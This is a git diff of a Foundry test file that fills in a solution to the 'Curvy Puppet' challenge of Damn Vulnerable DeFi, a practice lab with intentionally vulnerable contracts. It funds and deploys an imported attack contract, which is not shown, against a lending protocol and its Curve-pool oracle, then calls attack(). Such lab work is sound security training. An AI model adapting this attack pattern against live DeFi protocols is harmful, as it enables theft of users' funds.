@@ -9,6 +9,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {AttackCurvyPuppet} from "./AttackCurvyPuppet.sol";
 
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -158,7 +159,30 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        IERC20(curvePool.lp_token()).transferFrom(treasury, player, TREASURY_LP_BALANCE);
+        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
+
+        address[3] memory users = [alice, bob, charlie];
+        AttackCurvyPuppet attack = new AttackCurvyPuppet(
+            stETH,
+            curvePool,
+            weth,
+            users,
+            lending,
+            dvt,
+            IERC20(curvePool.lp_token()),
+            permit2,
+            treasury
+        );
+
+        weth.withdraw(weth.balanceOf(player));
+        payable(address(attack)).transfer(TREASURY_WETH_BALANCE);
+        IERC20(curvePool.lp_token()).transfer(
+            address(attack),
+            IERC20(curvePool.lp_token()).balanceOf(player)
+        );
+
+        attack.attack();
     }
 
     /**
